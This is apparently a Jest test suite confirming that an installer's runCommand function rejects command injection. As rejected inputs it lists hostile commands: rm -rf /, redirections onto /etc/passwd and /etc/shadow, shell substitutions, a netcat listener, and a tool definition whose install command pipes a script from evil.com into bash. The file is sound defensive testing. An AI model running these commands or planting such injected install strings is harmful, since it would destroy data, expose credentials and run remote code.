/**
 * Security validation tests for installer.ts
 * Verifies command injection vulnerability has been fixed
 */

import { runCommand } from '../src/utils/installer.js';

describe('Security: Command Injection Protection', () => {
  describe('runCommand validation', () => {
    it('should reject empty commands', async () => {
      await expect(runCommand('')).rejects.toThrow('Command cannot be empty');
    });

    it('should reject commands with shell metacharacters', async () => {
      const maliciousCommands = [
        'npm install; rm -rf /',
        'npm install && malicious-command',
        'npm install | grep secret',
        'npm install `whoami`',
        'npm install $(whoami)',
        'npm install ${USER}',
        'npm install > /etc/passwd',
        'npm install < /etc/shadow',
      ];

      for (const cmd of maliciousCommands) {
        await expect(runCommand(cmd)).rejects.toThrow(
          'potentially unsafe characters'
        );
      }
    });

    it('should reject disallowed commands', async () => {
      const disallowedCommands = [
        'rm -rf /',
        'sudo rm -rf /',
        'bash -c "malicious"',
        '/bin/sh -c "malicious"',
        'nc -lvp 1337',
      ];

      for (const cmd of disallowedCommands) {
        await expect(runCommand(cmd)).rejects.toThrow('not allowed');
      }
    });

    it('should allow safe npm commands', async () => {
      // This will fail if npm is not installed, but shouldn't throw validation errors
      try {
        await runCommand('npm --version');
      } catch (error) {
        // Check that it's not a validation error
        expect(error).not.toMatch(/not allowed/);
        expect(error).not.toMatch(/unsafe characters/);
      }
    });

    it('should allow safe npx commands', async () => {
      // This will fail if npx is not installed, but shouldn't throw validation errors
      try {
        await runCommand('npx --version');
      } catch (error) {
        // Check that it's not a validation error
        expect(error).not.toMatch(/not allowed/);
        expect(error).not.toMatch(/unsafe characters/);
      }
    });

    it('should allow safe python commands', async () => {
      try {
        await runCommand('python3 --version');
      } catch (error) {
        // Check that it's not a validation error
        expect(error).not.toMatch(/not allowed/);
        expect(error).not.toMatch(/unsafe characters/);
      }
    });

    it('should properly parse arguments', async () => {
      // Test that arguments are properly separated and not shell-interpreted
      try {
        await runCommand('node --version');
      } catch (error) {
        // Check that it's not a validation error
        expect(error).not.toMatch(/not allowed/);
        expect(error).not.toMatch(/unsafe characters/);
      }
    });
  });

  describe('Process cleanup', () => {
    it('should handle SIGTERM gracefully', () => {
      // Verify that signal handlers are set up
      const listeners = process.listeners('SIGTERM');
      expect(listeners.length).toBeGreaterThan(0);
    });

    it('should handle SIGINT gracefully', () => {
      // Verify that signal handlers are set up
      const listeners = process.listeners('SIGINT');
      expect(listeners.length).toBeGreaterThan(0);
    });

    it('should handle process exit', () => {
      // Verify that exit handler is set up
      const listeners = process.listeners('exit');
      expect(listeners.length).toBeGreaterThan(0);
    });
  });
});

describe('Security: CVE-2024-XXXX Regression Test', () => {
  it('should prevent command injection via malicious tool names', async () => {
    const maliciousTool = {
      name: 'malicious-tool',
      displayName: 'Malicious Tool',
      installCommand: 'npm install fake-package; curl http://evil.com/shell.sh | bash',
      verifyCommand: 'which fake-package',
      docUrl: 'https://example.com'
    };

    // This should be caught by validation
    await expect(runCommand(maliciousTool.installCommand)).rejects.toThrow(
      'potentially unsafe characters'
    );
  });

  it('should prevent shell injection via backticks', async () => {
    await expect(runCommand('npm install `whoami`')).rejects.toThrow(
      'potentially unsafe characters'
    );
  });

  it('should prevent shell injection via command substitution', async () => {
    await expect(runCommand('npm install $(malicious-command)')).rejects.toThrow(
      'potentially unsafe characters'
    );
  });

  it('should prevent shell injection via variable substitution', async () => {
    await expect(runCommand('npm install ${MALICIOUS_VAR}')).rejects.toThrow(
      'potentially unsafe characters'
    );
  });
});
